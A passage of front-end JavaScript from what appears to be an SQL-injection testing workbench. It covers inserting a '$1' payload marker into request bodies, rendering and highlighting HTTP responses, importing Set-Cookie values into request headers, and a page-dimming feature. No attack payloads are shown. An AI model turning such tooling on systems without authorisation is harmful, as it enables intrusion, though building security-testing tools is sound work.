        bodyPreviewTip.classList.remove('show');
      });
      postBodyInput.addEventListener('input', () => {
        if (bodyPreviewTip.classList.contains('show')) updateBodyPreview();
      });
    }

    // Insert $1 marker at cursor inside Request Body
    const insertMarkerBodyBtn = $('#insertMarkerBodyBtn');
    if (insertMarkerBodyBtn && postBodyInput) {
      insertMarkerBodyBtn.addEventListener('click', () => {
        const ta = postBodyInput;
        const start = ta.selectionStart;
        const end = ta.selectionEnd;
        const before = ta.value.substring(0, start);
        const after = ta.value.substring(end);
        ta.value = before + '$1' + after;
        const pos = start + 2;
        ta.setSelectionRange(pos, pos);
        ta.focus();
        showToast('$1 marker inserted — hover body to preview', 'success');
      });
    }

    // ===== Response Display =====
    function clearResponseView() {
      if (renderedPlaceholder) {
        renderedPlaceholder.classList.remove('hidden');
        renderedPlaceholder.style.display = '';
      }
      if (renderedFrame) {
        renderedFrame.classList.add('hidden');
        renderedFrame.style.display = '';
      }
      renderedFrame.srcdoc = '';
      state.lastRenderedHtml = '';
      rawResponse.innerHTML = 'No response data.';
      metaTableWrap.innerHTML = '<div class="meta-empty">No metadata available.</div>';
      const reqWrap = document.getElementById('reqMetaTableWrap');
      if (reqWrap) reqWrap.innerHTML = '<div class="meta-empty">No request headers.</div>';
      $('#sbStatus').textContent = '—';
      $('#sbTime').textContent = '—';
      $('#sbSize').textContent = '—';
      $('#sbType').textContent = '—';
      $('#sbStatus').className = '';
    }

    function displayResponse(resp, targetUrl) {
      const sbStatus = $('#sbStatus');
      sbStatus.textContent = `${resp.status} ${resp.statusText}`;
      sbStatus.className = resp.status >= 500 ? 'status-err'
        : resp.status >= 400 ? 'status-warn'
        : resp.status > 0 ? 'status-ok' : 'status-err';
      $('#sbTime').textContent = `${resp.timeMs} ms`;
      const bodyLen = (resp.body || '').length;
      $('#sbSize').textContent = `${bodyLen} B`;
      $('#sbType').textContent = (resp.headers && (resp.headers['Content-Type'] || resp.headers['content-type'])) || '—';

      // Syntax-highlighted raw body
      const rawBody = resp.body || '';
      const ct = (resp.headers && (resp.headers['Content-Type'] || resp.headers['content-type'])) || '';
      rawResponse.innerHTML = highlightCode(rawBody, ct);

      const legend = `<div class="meta-legend">
        <span><i style="background:#ff6b6b"></i> Security</span>
        <span><i style="background:#ffd93d"></i> Auth / Cookie</span>
        <span><i style="background:#6bcB77"></i> Cache</span>
        <span><i style="background:#4dabf7"></i> Content</span>
        <span><i style="background:#b197fc"></i> Server</span>
        <span><i style="background:#ff922b"></i> CORS</span>
      </div>`;
      let tableHtml = legend + `<table class="meta-table">
        <tr><th>Status Code</th><td><span class="meta-val-num">${resp.status}</span> ${escapeHtml(resp.statusText || '')}</td></tr>
        <tr><th>Response Time</th><td><span class="meta-val-num">${resp.timeMs}</span> ms</td></tr>
        <tr><th>Body Size</th><td><span class="meta-val-num">${bodyLen}</span> bytes</td></tr>`;
      if (resp.finalUrl && resp.finalUrl !== targetUrl) {
        tableHtml += `<tr class="meta-cat-content"><th><span class="meta-key">Final URL</span><span class="meta-badge content">Redirect</span></th><td><span class="meta-val-url">${escapeHtml(resp.finalUrl)}</span></td></tr>`;
      }
      if (resp.headers) {
        tableHtml += highlightHeadersTable(resp.headers);
      }
      tableHtml += '</table>';
      // Cookie import UI when Set-Cookie present
      tableHtml += renderCookieImportPanel(resp.headers);
      metaTableWrap.innerHTML = tableHtml;
      // Request headers — same categorized / colorful table as response
      const reqWrap = document.getElementById('reqMetaTableWrap');
      if (reqWrap) {
        const histItem = state.history.find((h) => h.id === state.activeHistoryId);
        const reqH = (histItem && histItem.headers) ? histItem.headers : {};
        const reqKeys = Object.keys(reqH || {});
        if (!reqKeys.length) {
          reqWrap.innerHTML = '<div class="meta-empty">No request headers stored for this entry.</div>';
        } else {
          const reqLegend = `<div class="meta-legend">
            <span><i style="background:#ff6b6b"></i> Security</span>
            <span><i style="background:#ffd93d"></i> Auth / Cookie</span>
            <span><i style="background:#6bcB77"></i> Cache</span>
            <span><i style="background:#4dabf7"></i> Content</span>
            <span><i style="background:#b197fc"></i> Server</span>
            <span><i style="background:#ff922b"></i> CORS</span>
          </div>`;
          let reqTable = reqLegend + '<table class="meta-table">';
          const method = histItem && histItem.method ? histItem.method : '';
          const url = histItem && histItem.url ? histItem.url : (targetUrl || '');
          if (method || url) {
            reqTable += `<tr><th>Method</th><td><span class="meta-val-num">${escapeHtml(method || '—')}</span></td></tr>`;
            reqTable += `<tr class="meta-cat-content"><th><span class="meta-key">URL</span><span class="meta-badge content">Target</span></th><td><span class="meta-val-url">${escapeHtml(url)}</span></td></tr>`;
          }
          reqTable += highlightHeadersTable(reqH);
          reqTable += '</table>';
          reqWrap.innerHTML = reqTable;
        }
      }

      bindCookieImportPanel();

      // Prefer backend's fixed_html (already has <base> injected), otherwise do it client-side
      let htmlToRender = resp.fixedHtml || resp.body || '';

      if (!resp.fixedHtml && htmlToRender) {
        let baseHref = targetUrl || 'https://example.com/';
        try {
          const u = new URL(targetUrl);
          baseHref = u.origin + u.pathname.replace(/\/[^/]*$/, '/');
        } catch {}
        htmlToRender = /<head[^>]*>/i.test(htmlToRender)
          ? htmlToRender.replace(/<head[^>]*>/i, (m) => `${m}\n<base href="${baseHref}">`)
          : `<base href="${baseHref}">\n${htmlToRender}`;
      }

      // Light JS-friendly cleanup so basic site UI scripts can run in the preview iframe
      htmlToRender = prepareHtmlForRender(htmlToRender);

      // Night Protect — soft CSS and/or strict smart dimming
      if (state.nightProtectMode > 0) {
        htmlToRender = applyNightProtect(htmlToRender, state.nightProtectMode);
      }

      // Inject interaction bridge so links/forms work through our proxy
      htmlToRender = injectInteractionBridge(htmlToRender, targetUrl);

      if (renderedPlaceholder) {
        renderedPlaceholder.classList.add('hidden');
        renderedPlaceholder.style.display = 'none';
      }
      if (renderedFrame) {
        renderedFrame.classList.remove('hidden');
        renderedFrame.style.display = 'block';
      }
      // Store for Expand modal (always latest)
      state.lastRenderedHtml = htmlToRender;

      // Clear then set (next frame) so browser always repaints after navigation
      renderedFrame.removeAttribute('srcdoc');
      requestAnimationFrame(() => {
        renderedFrame.srcdoc = htmlToRender || '<pre style="color:#ccc;padding:16px;font:12px monospace;">Empty response body</pre>';
      });

      // If expand modal is open on rendered tab, refresh it too
      if (modalOverlay.classList.contains('open') && activeTab === 'rendered') {
        openModal();
      }
    }

    /** Lightweight syntax highlighter for HTML / JSON / CSS / JS */
    function highlightCode(code, contentType) {
      if (!code) return 'No response data.';
      const ct = (contentType || '').toLowerCase();
      const trimmed = code.trim();

      // JSON
      if (ct.includes('json') || ((trimmed.startsWith('{') || trimmed.startsWith('[')) && (() => { try { JSON.parse(trimmed); return true; } catch { return false; } })())) {
        return highlightJson(code);
      }
      // HTML / XML
      if (ct.includes('html') || ct.includes('xml') || /<\/?[a-zA-Z][\s\S]*>/.test(trimmed.slice(0, 500))) {
        return highlightHtml(code);
      }
      // CSS
      if (ct.includes('css')) {
        return highlightCss(code);
      }
      // JS
      if (ct.includes('javascript') || ct.includes('ecmascript')) {
        return highlightJs(code);
      }
      // Fallback: try HTML-ish
      if (trimmed.includes('<') && trimmed.includes('>')) return highlightHtml(code);
      return escapeHtml(code);
    }

    function highlightHtml(src) {
      let s = escapeHtml(src);
      // Doctype
      s = s.replace(/(&lt;!DOCTYPE[\s\S]*?&gt;)/gi, '<span class="tok-comment">$1</span>');
      // Comments
      s = s.replace(/(&lt;!--[\s\S]*?--&gt;)/g, '<span class="tok-comment">$1</span>');
      // Style / script blocks content
      s = s.replace(/(&lt;style[^&]*&gt;)([\s\S]*?)(&lt;\/style&gt;)/gi, (_, a, body, c) => {
        return a.replace(/(&lt;\/?)([\w:-]+)/g, '<span class="tok-tag">$1</span><span class="tok-name">$2</span>')
          + highlightCss(body.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&amp;/g, '&'))
          + c.replace(/(&lt;\/?)([\w:-]+)/g, '<span class="tok-tag">$1</span><span class="tok-name">$2</span>');
      });
      // Tags + attributes (including short and unquoted values)
      s = s.replace(/(&lt;\/?)([\w:-]+)((?:[^&]|&(?!gt;))*?)(\/?&gt;)/g, (_, open, name, attrs, close) => {
        const coloredAttrs = attrs.replace(
          /([\w:-]+)(?:\s*=\s*(?:(&quot;[\s\S]*?&quot;)|(&#39;[\s\S]*?&#39;)|([^\s&gt;]+)))?/g,
          (m, attr, dq, sq, bare) => {
            if (dq || sq || bare) {
              return `<span class="tok-attr">${attr}</span>=<span class="tok-str">${dq || sq || bare}</span>`;
            }
            return `<span class="tok-attr">${attr}</span>`;
          }
        );
        return `<span class="tok-tag">${open}</span><span class="tok-name">${name}</span>${coloredAttrs}<span class="tok-tag">${close}</span>`;
      });
      return s;
    }

    function highlightJson(src) {
      // Tokenize more carefully so keys/strings/numbers all color
      let out = '';
      let i = 0;
      const s = src;
      while (i < s.length) {
        const ch = s[i];
        if (ch === '"' || ch === "'") {
          const q = ch;
          let j = i + 1;
          while (j < s.length) {
            if (s[j] === '\\') { j += 2; continue; }
            if (s[j] === q) { j++; break; }
            j++;
          }
          const str = escapeHtml(s.slice(i, j));
          // look ahead for key
          let k = j;
          while (k < s.length && /\s/.test(s[k])) k++;
          if (s[k] === ':') {
            out += `<span class="tok-key">${str}</span>`;
          } else {
            out += `<span class="tok-str">${str}</span>`;
          }
          i = j;
          continue;
        }
        if (/[-\d]/.test(ch)) {
          let j = i + 1;
          while (j < s.length && /[\d.eE+-]/.test(s[j])) j++;
          out += `<span class="tok-num">${escapeHtml(s.slice(i, j))}</span>`;
          i = j;
          continue;
        }
        if (/[a-zA-Z_]/.test(ch)) {
          let j = i + 1;
          while (j < s.length && /[\w]/.test(s[j])) j++;
          const word = s.slice(i, j);
          if (word === 'true' || word === 'false') out += `<span class="tok-bool">${word}</span>`;
          else if (word === 'null') out += `<span class="tok-null">null</span>`;
          else out += escapeHtml(word);
          i = j;
          continue;
        }
        if ('{}[],:'.includes(ch)) {
          out += `<span class="tok-punct">${ch}</span>`;
          i++;
          continue;
        }
        out += escapeHtml(ch);
        i++;
      }
      return out;
    }

    function highlightCss(src) {
      let s = escapeHtml(src);
      s = s.replace(/(\/\*[\s\S]*?\*\/)/g, '<span class="tok-comment">$1</span>');
      s = s.replace(/(#[0-9a-fA-F]{3,8})\b/g, '<span class="tok-num">$1</span>');
      s = s.replace(/(\.[a-zA-Z_][\w-]*)/g, '<span class="tok-name">$1</span>');
      s = s.replace(/((?:^|[{};\s])[a-zA-Z-]+)(\s*:)/gm, (m, prop, col) => {
        return m.replace(prop.trim(), `<span class="tok-attr">${prop.trim()}</span>`);
      });
      s = s.replace(/(:\s*)([^;{}]+)/g, '$1<span class="tok-str">$2</span>');
      return s;
    }

    function highlightJs(src) {
      let s = escapeHtml(src);
      s = s.replace(/(\/\/[^\n]*|\/\*[\s\S]*?\*\/)/g, '<span class="tok-comment">$1</span>');
      s = s.replace(/(&quot;[\s\S]*?&quot;|'[^']*'|`[^`]*`)/g, '<span class="tok-str">$1</span>');
      s = s.replace(/\b(const|let|var|function|return|if|else|for|while|class|new|this|async|await|import|export|from|default|true|false|null|undefined|typeof|instanceof|try|catch|throw|finally)\b/g,
        '<span class="tok-name">$1</span>');
      s = s.replace(/\b(-?\d+\.?\d*)\b/g, '<span class="tok-num">$1</span>');
      s = s.replace(/\b([a-zA-Z_$][\w$]*)\s*(?=\()/g, '<span class="tok-attr">$1</span>');
      return s;
    }

    /**
     * Split joined Set-Cookie strings.
     * Proxies often join multiple Set-Cookie with commas, but Expires dates also contain commas
     * (e.g. "Thu, 24 Aug 2028"). Split only before a cookie-name= token.
     */
    function splitJoinedSetCookies(raw) {
      const s = String(raw || '').trim();
      if (!s) return [];
      // Cookie-name chars per RFC-ish: token before '=' that is not a date fragment
      return s.split(/,(?=\s*[A-Za-z_][A-Za-z0-9!#$%&'*+\-.^_`|~]*=)/).map((x) => x.trim()).filter(Boolean);
    }

    /** Parse a single Set-Cookie header value into name/value/attrs */
    function parseSetCookieHeader(raw) {
      const s = String(raw || '').trim();
      if (!s) return null;
      const parts = s.split(';');
      const nv = (parts[0] || '').trim();
      const eq = nv.indexOf('=');
      if (eq <= 0) return null;
      return {
        name: nv.slice(0, eq).trim(),
        value: nv.slice(eq + 1).trim(),
        pair: nv.trim(),
        raw: s,
        attrs: parts.slice(1).map((p) => p.trim()).filter(Boolean),
      };
    }

    /** Collect all Set-Cookie entries from a response headers object */
    function getSetCookiesFromHeaders(headers) {
      if (!headers) return [];
      const out = [];
      const seen = new Set();
      for (const [k, v] of Object.entries(headers)) {
        if (k.toLowerCase() !== 'set-cookie') continue;
        const list = Array.isArray(v) ? v : [v];
        list.forEach((item) => {
          // Newlines and/or comma-joined multi-cookies
          String(item).split(/\r?\n/).forEach((line) => {
            splitJoinedSetCookies(line).forEach((piece) => {
              const parsed = parseSetCookieHeader(piece);
              if (!parsed || seen.has(parsed.name)) return;
              seen.add(parsed.name);
              out.push(parsed);
            });
          });
        });
      }
      return out;
    }

    /** Merge selected cookie pairs into request Cookie header */
    function applySetCookiesToRequestHeaders(pairs) {
      if (!pairs || !pairs.length) {
        showToast('No cookies selected');
        return;
      }
      const map = {};
      let cookieHeader = state.headers.find((h) => (h.key || '').toLowerCase() === 'cookie');
      if (cookieHeader && cookieHeader.value) {
        String(cookieHeader.value).split(';').forEach((part) => {
          const t = part.trim();
          const eq = t.indexOf('=');
          if (eq > 0) map[t.slice(0, eq).trim()] = t.slice(eq + 1).trim();
        });
      }
      pairs.forEach((pair) => {
        const eq = pair.indexOf('=');
        if (eq > 0) map[pair.slice(0, eq).trim()] = pair.slice(eq + 1).trim();
      });
      const newVal = Object.entries(map).map(([k, v]) => `${k}=${v}`).join('; ');
      if (cookieHeader) {
        cookieHeader.value = newVal;
      } else {
        state.headers.push({ key: 'Cookie', value: newVal });
      }
      if (typeof savePersistedHeaders === 'function') savePersistedHeaders();
      if (typeof renderHeaders === 'function') renderHeaders();
      if (typeof openHeadersSettings === 'function') openHeadersSettings();
      showToast(`Added ${pairs.length} cookie(s) to Cookie header`, 'success');
    }

    function renderCookieImportPanel(headers) {
      const cookies = getSetCookiesFromHeaders(headers);
      if (!cookies.length) return '';
      const items = cookies.map((c, i) => `
        <label class="cookie-import-item selected" data-idx="${i}">
          <input type="checkbox" checked data-pair="${escapeHtml(c.pair)}" />
          <span>
            <span class="ci-pair">${escapeHtml(c.pair)}</span>
            ${c.attrs.length ? `<span class="ci-attrs">${escapeHtml(c.attrs.join(' · '))}</span>` : ''}
          </span>
        </label>
      `).join('');
      // Default CLOSED — opens via Set-Cookie row click or history neon badge
      return `
        <div class="cookie-import-panel" id="cookieImportPanel">
          <div class="cookie-import-title">
            <span style="width:8px;height:8px;border-radius:50%;background:#ffd93d;box-shadow:0 0 8px #ffd93d;display:inline-block;"></span>
            <span>Set-Cookie — pick which to add as request Cookie</span>
            <button type="button" class="ci-close" id="cookieImportClose" title="Close">×</button>
          </div>
          <div class="cookie-import-list" id="cookieImportList">${items}</div>
          <div class="cookie-import-actions">
            <button type="button" class="btn btn-sm btn-ghost" id="cookieImportSelectAll">All</button>
            <button type="button" class="btn btn-sm btn-ghost" id="cookieImportSelectNone">None</button>
            <button type="button" class="btn btn-sm btn-primary" id="cookieImportApply">Add selected → Headers</button>
          </div>
        </div>
      `;
    }

    function openCookieImportPanel() {
      const panel = $('#cookieImportPanel');
      if (!panel) {
        showToast('No Set-Cookie in this response');
        return;
      }
      panel.classList.add('open');
      panel.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
    }
    function closeCookieImportPanel() {
      $('#cookieImportPanel')?.classList.remove('open');
    }

    /**
     * Cookie import from History badge — works in main UI and solo History tab.
     * Does not rely on the response Headers tab (hidden in solo).
     * Applying still writes request Cookie headers (synced via localStorage).
     */
    function openHistoryCookieImport(item) {
      const cookies = getSetCookiesFromHeaders(item && item.response && item.response.headers);
      if (!cookies.length) {
        showToast('No Set-Cookie in this response');
        return;
      }
      let ov = $('#histCookieOverlay');
      if (!ov) {
        ov = document.createElement('div');
        ov.id = 'histCookieOverlay';
        ov.className = 'hist-cookie-overlay';
        document.body.appendChild(ov);
      }
      const items = cookies.map((c, i) => `
        <label class="cookie-import-item selected" data-idx="${i}">
          <input type="checkbox" checked data-pair="${escapeHtml(c.pair)}" />
          <span>
            <span class="ci-pair">${escapeHtml(c.pair)}</span>
            ${c.attrs.length ? `<span class="ci-attrs">${escapeHtml(c.attrs.join(' · '))}</span>` : ''}
          </span>
        </label>
      `).join('');
      ov.innerHTML = `
        <div class="hist-cookie-card" role="dialog" aria-label="Import Set-Cookie">
          <div class="cookie-import-title">
            <span style="width:8px;height:8px;border-radius:50%;background:#ffd93d;box-shadow:0 0 8px #ffd93d;display:inline-block;"></span>
            <span>Set-Cookie — add to request headers</span>
            <button type="button" class="ci-close" id="histCookieClose" title="Close">×</button>
          </div>
          <p class="hist-cookie-hint">Applies to Cookie header used on the next Send (synced across tabs).</p>
          <div class="cookie-import-list" id="histCookieList">${items}</div>
          <div class="cookie-import-actions">
            <button type="button" class="btn btn-sm btn-ghost" id="histCookieAll">All</button>
            <button type="button" class="btn btn-sm btn-ghost" id="histCookieNone">None</button>
            <button type="button" class="btn btn-sm btn-primary" id="histCookieApply">Add selected → Headers</button>
          </div>
        </div>`;
      ov.classList.add('open');

      const list = ov.querySelector('#histCookieList');
      list?.querySelectorAll('.cookie-import-item').forEach((el) => {
        const cb = el.querySelector('input');
        cb?.addEventListener('change', () => el.classList.toggle('selected', !!cb.checked));
      });
      ov.querySelector('#histCookieClose')?.addEventListener('click', () => ov.classList.remove('open'));
      ov.addEventListener('click', (e) => { if (e.target === ov) ov.classList.remove('open'); });
      ov.querySelector('#histCookieAll')?.addEventListener('click', () => {
        list?.querySelectorAll('input[type=checkbox]').forEach((cb) => {
          cb.checked = true;
          cb.closest('.cookie-import-item')?.classList.add('selected');
        });
      });
      ov.querySelector('#histCookieNone')?.addEventListener('click', () => {
        list?.querySelectorAll('input[type=checkbox]').forEach((cb) => {
          cb.checked = false;
          cb.closest('.cookie-import-item')?.classList.remove('selected');
        });
      });
      ov.querySelector('#histCookieApply')?.addEventListener('click', () => {
        const pairs = [...(list?.querySelectorAll('input[type=checkbox]:checked') || [])]
          .map((cb) => cb.dataset.pair)
          .filter(Boolean);
        if (typeof applySetCookiesToRequestHeaders === 'function') {
          applySetCookiesToRequestHeaders(pairs);
        }
        ov.classList.remove('open');
        showToast(pairs.length ? `Added ${pairs.length} cookie(s) to headers` : 'Nothing selected', pairs.length ? 'success' : '');
      });
    }

    function bindCookieImportPanel() {
      const panel = $('#cookieImportPanel');
      if (!panel) return;
      panel.querySelectorAll('.cookie-import-item').forEach((el) => {
        const cb = el.querySelector('input');
        const sync = () => el.classList.toggle('selected', !!cb?.checked);
        cb?.addEventListener('change', sync);
      });
      $('#cookieImportClose')?.addEventListener('click', closeCookieImportPanel);
      $('#cookieImportSelectAll')?.addEventListener('click', () => {
        panel.querySelectorAll('input[type=checkbox]').forEach((cb) => {
          cb.checked = true;
          cb.closest('.cookie-import-item')?.classList.add('selected');
        });
      });
      $('#cookieImportSelectNone')?.addEventListener('click', () => {
        panel.querySelectorAll('input[type=checkbox]').forEach((cb) => {
          cb.checked = false;
          cb.closest('.cookie-import-item')?.classList.remove('selected');
        });
      });
      $('#cookieImportApply')?.addEventListener('click', () => {
        const pairs = [...panel.querySelectorAll('input[type=checkbox]:checked')]
          .map((cb) => cb.dataset.pair)
          .filter(Boolean);
        applySetCookiesToRequestHeaders(pairs);
        closeCookieImportPanel();
      });
      // Click Set-Cookie table rows to open panel
      metaTableWrap.querySelectorAll('tr.set-cookie-row').forEach((row) => {
        row.addEventListener('click', () => openCookieImportPanel());
      });
    }

    function highlightHeadersTable(headers) {
      const CATEGORIES = {
        security: {
          keys: ['content-security-policy', 'x-frame-options', 'x-xss-protection', 'x-content-type-options',
            'strict-transport-security', 'referrer-policy', 'permissions-policy', 'cross-origin-opener-policy',
            'cross-origin-resource-policy', 'cross-origin-embedder-policy'],
          badge: 'security', label: 'Security',
        },
        auth: {
          keys: ['set-cookie', 'cookie', 'authorization', 'www-authenticate', 'proxy-authenticate',
            'proxy-authorization', 'x-csrf-token', 'x-xsrf-token'],
          badge: 'auth', label: 'Auth',
        },
        cache: {
          keys: ['cache-control', 'etag', 'last-modified', 'expires', 'age', 'pragma', 'vary'],
          badge: 'cache', label: 'Cache',
        },
        content: {
          keys: ['content-type', 'content-length', 'content-encoding', 'content-language',
            'content-disposition', 'transfer-encoding', 'accept-ranges'],
          badge: 'content', label: 'Content',
        },
        server: {
          keys: ['server', 'x-powered-by', 'x-aspnet-version', 'x-aspnetmvc-version', 'via', 'date'],
          badge: 'server', label: 'Server',
        },
        cors: {
          keys: ['access-control-allow-origin', 'access-control-allow-methods', 'access-control-allow-headers',
            'access-control-allow-credentials', 'access-control-expose-headers', 'access-control-max-age'],
          badge: 'cors', label: 'CORS',
        },
      };

      function categorize(key) {
        const lk = key.toLowerCase();
        for (const [cat, info] of Object.entries(CATEGORIES)) {
          if (info.keys.includes(lk)) return { cat, ...info };
        }
        if (lk.startsWith('x-')) return { cat: 'server', badge: 'server', label: 'Custom' };
        return null;
      }

      function formatValue(key, val) {
        const s = String(val);
        const lk = key.toLowerCase();
        if (lk === 'set-cookie' || lk === 'cookie') {
          return `<span class="meta-val-cookie">${escapeHtml(s)}</span>`;
        }
        if (lk === 'location' || lk.includes('url')) {
          return `<span class="meta-val-url">${escapeHtml(s)}</span>`;
        }
        if (lk === 'content-length' || lk === 'age' || /^\d+$/.test(s.trim())) {
          return `<span class="meta-val-num">${escapeHtml(s)}</span>`;
        }
        return escapeHtml(s);
      }

      let rows = '';
      for (const [k, v] of Object.entries(headers || {})) {
        const info = categorize(k);
        const rowClass = info ? `meta-cat-${info.cat}` : '';
        const badge = info
          ? `<span class="meta-badge ${info.badge}">${info.label}</span>`
          : '';
        const isSetCookie = k.toLowerCase() === 'set-cookie';
        const scClass = isSetCookie ? ' set-cookie-row' : '';
        rows += `<tr class="${rowClass}${scClass}" title="${isSetCookie ? 'Click to import cookies' : ''}"><th><span class="meta-key">${escapeHtml(k)}</span>${badge}</th><td>${formatValue(k, v)}${isSetCookie ? ' <span class="meta-badge auth">click to import</span>' : ''}</td></tr>`;
      }
      return rows;
    }

    // ===== Night Protect config (localStorage) =====
    const NP_KEY = 'sqli-workbench-nightprotect';
    const NP_DEFAULTS = {
      defaultMode: 1,
      colorTarget: 'bright', // 'white' | 'bright'
      brightThresh: 78,      // % luminance 0-100
      dimWhite: 70,          // % strength for near-white
      dimColor: 45,          // % strength for other bright hues (same-family)
      minW: 120,
      minH: 48,
      minArea: 18000,
      fixText: true,
    };

    function loadNpConfig() {
      try {
        return { ...NP_DEFAULTS, ...JSON.parse(localStorage.getItem(NP_KEY) || '{}') };
      } catch { return { ...NP_DEFAULTS }; }
    }
    function saveNpConfig(cfg) {
      try { localStorage.setItem(NP_KEY, JSON.stringify(cfg)); } catch {}
    }
    let npConfig = loadNpConfig();

    function syncNpSettingsUI() {
      const set = (id, val) => { const el = $('#' + id); if (el) el.value = val; };
      set('npDefaultMode', npConfig.defaultMode);
      set('npColorTarget', npConfig.colorTarget);
      set('npBrightThresh', npConfig.brightThresh);
      set('npDimWhite', npConfig.dimWhite);
      set('npDimColor', npConfig.dimColor);
      set('npMinW', npConfig.minW);
      set('npMinH', npConfig.minH);
      set('npMinArea', npConfig.minArea);
      set('npFixText', npConfig.fixText ? '1' : '0');
      const bl = $('#npBrightLabel'); if (bl) bl.textContent = npConfig.brightThresh + '%';
      const dw = $('#npDimWhiteLabel'); if (dw) dw.textContent = npConfig.dimWhite + '%';
      const dc = $('#npDimColorLabel'); if (dc) dc.textContent = npConfig.dimColor + '%';
    }

    function bindNpSettingsUI() {
      const persist = () => {
        npConfig = {
          defaultMode: +($('#npDefaultMode')?.value ?? npConfig.defaultMode),
          colorTarget: $('#npColorTarget')?.value || npConfig.colorTarget,
          brightThresh: +($('#npBrightThresh')?.value ?? npConfig.brightThresh),
          dimWhite: +($('#npDimWhite')?.value ?? npConfig.dimWhite),
          dimColor: +($('#npDimColor')?.value ?? npConfig.dimColor),
          minW: +($('#npMinW')?.value ?? npConfig.minW),
          minH: +($('#npMinH')?.value ?? npConfig.minH),
          minArea: +($('#npMinArea')?.value ?? npConfig.minArea),
          fixText: ($('#npFixText')?.value ?? '1') === '1',
        };
        saveNpConfig(npConfig);
        syncNpSettingsUI();
        // live re-apply if currently protecting
        if (state.nightProtectMode > 0 && state.activeHistoryId != null) {
          const item = state.history.find(h => h.id === state.activeHistoryId);
          if (item) displayResponse(item.response, item.url);
        }
      };
      ['npDefaultMode', 'npColorTarget', 'npBrightThresh', 'npDimWhite', 'npDimColor',
        'npMinW', 'npMinH', 'npMinArea', 'npFixText'].forEach((id) => {
        const el = $('#' + id);
        if (!el) return;
        el.addEventListener('input', persist);
        el.addEventListener('change', persist);
      });
      const reset = $('#npResetBtn');
      if (reset) {
        reset.addEventListener('click', () => {
          npConfig = { ...NP_DEFAULTS };
          saveNpConfig(npConfig);
          syncNpSettingsUI();
          showToast('Night Protect settings reset', 'success');
        });
      }
    }

    /**
     * Night Protect modes:
     *  1 = soft  — page-level dark wash
     *  2 = strict — soft + JS dims large bright surfaces in-family (configurable)
     */
    function applyNightProtect(html, mode) {
      const cfg = npConfig || loadNpConfig();
      const softCss = `<style id="sqli-night-protect">
html, body {
  background-color: #0c0c10 !important;
  color: #e4e4ea !important;
}
img, video, canvas { opacity: 0.9; }
[style*="background:#fff"], [style*="background: #fff"],
[style*="background:#ffffff"], [style*="background: #ffffff"],
[style*="background:white"], [style*="background: white"],
[style*="background-color:#fff"], [style*="background-color: #fff"],
[style*="background-color:#ffffff"], [style*="background-color:white"],
[style*="background:#fafafa"], [style*="background:#f5f5f5"],
[style*="background:#f8f9fa"], [style*="background:#eee"] {
  background-color: #1a1a22 !important;
  color: #e4e4ea !important;
}
</style>`;

      const cfgJson = JSON.stringify({
        colorTarget: cfg.colorTarget || 'bright',
        brightThresh: (cfg.brightThresh != null ? cfg.brightThresh : 78) / 100,
        dimWhite: (cfg.dimWhite != null ? cfg.dimWhite : 70) / 100,
        dimColor: (cfg.dimColor != null ? cfg.dimColor : 45) / 100,
        minW: cfg.minW || 120,
        minH: cfg.minH || 48,
        minArea: cfg.minArea || 18000,
        fixText: cfg.fixText !== false,
      });

      const strictScript = mode >= 2 ? `<script id="sqli-night-strict">
(function(){
  if (window.__sqliNightStrict) return;
  window.__sqliNightStrict = true;
  var CFG = ${cfgJson};

  function parseColor(str) {
    if (!str || str === 'transparent' || str === 'rgba(0, 0, 0, 0)') return null;
    var d = document.createElement('div');
    d.style.color = str;
    d.style.display = 'none';
    document.documentElement.appendChild(d);
    var cs = getComputedStyle(d).color;
    d.remove();
    var m = cs && cs.match(/rgba?\\((\\d+),\\s*(\\d+),\\s*(\\d+)/);
    if (!m) return null;
    return { r: +m[1], g: +m[2], b: +m[3] };
  }

  function luminance(c) {
    return (0.2126 * c.r + 0.7152 * c.g + 0.0722 * c.b) / 255;
  }

  function rgbToHsl(c) {
    var r = c.r / 255, g = c.g / 255, b = c.b / 255;
    var max = Math.max(r, g, b), min = Math.min(r, g, b);
    var h = 0, s = 0, l = (max + min) / 2;
    if (max !== min) {
      var d = max - min;
      s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
      if (max === r) h = ((g - b) / d + (g < b ? 6 : 0)) / 6;
      else if (max === g) h = ((b - r) / d + 2) / 6;
      else h = ((r - g) / d + 4) / 6;
    }
    return { h: h, s: s, l: l };
  }

  function hslToRgb(h, s, l) {
    function hue2rgb(p, q, t) {
      if (t < 0) t += 1;
      if (t > 1) t -= 1;
      if (t < 1/6) return p + (q - p) * 6 * t;
      if (t < 1/2) return q;
      if (t < 2/3) return p + (q - p) * (2/3 - t) * 6;
      return p;
    }
    var r, g, b;
    if (s === 0) { r = g = b = l; }
    else {
      var q = l < 0.5 ? l * (1 + s) : l + s - l * s;
      var p = 2 * l - q;
      r = hue2rgb(p, q, h + 1/3);
      g = hue2rgb(p, q, h);
      b = hue2rgb(p, q, h - 1/3);
    }
    return { r: Math.round(r * 255), g: Math.round(g * 255), b: Math.round(b * 255) };
  }

  function isNearWhite(c) {
    if (!c) return false;
    var hsl = rgbToHsl(c);
    return hsl.l > 0.85 && hsl.s < 0.25;
  }

  function shouldDim(c) {
    if (!c) return false;
    var lum = luminance(c);
    if (lum < CFG.brightThresh) return false;
    if (CFG.colorTarget === 'white') return isNearWhite(c);
    return true; // all bright colors
  }

  // Dim within same hue family: lower lightness, slightly reduce saturation
  function dimInFamily(c, strength) {
    var hsl = rgbToHsl(c);
    var newL = hsl.l * (1 - strength * 0.85);
    // floor so we never go pure black
    newL = Math.max(0.12, newL);
    var newS = hsl.s * (1 - strength * 0.35);
    return hslToRgb(hsl.h, newS, newL);
  }

  function lightenText(c) {
    if (!c || luminance(c) > 0.65) return { r: 228, g: 228, b: 234 };
    if (luminance(c) > 0.45) return c;
    return {
      r: Math.min(255, Math.round(c.r + (228 - c.r) * 0.75)),
      g: Math.min(255, Math.round(c.g + (228 - c.g) * 0.75)),
      b: Math.min(255, Math.round(c.b + (228 - c.b) * 0.75))
    };
  }

  function cssRgb(c) { return 'rgb(' + c.r + ',' + c.g + ',' + c.b + ')'; }

  function areaOf(el) {
    var r = el.getBoundingClientRect();
    return Math.max(0, r.width) * Math.max(0, r.height);
  }

  function shouldSkip(el) {
    if (!el || el.nodeType !== 1) return true;
    var tag = el.tagName;
    if (/^(SCRIPT|STYLE|LINK|META|BR|HR|SVG|PATH|IMG|VIDEO|CANVAS|IFRAME)$/i.test(tag)) return true;
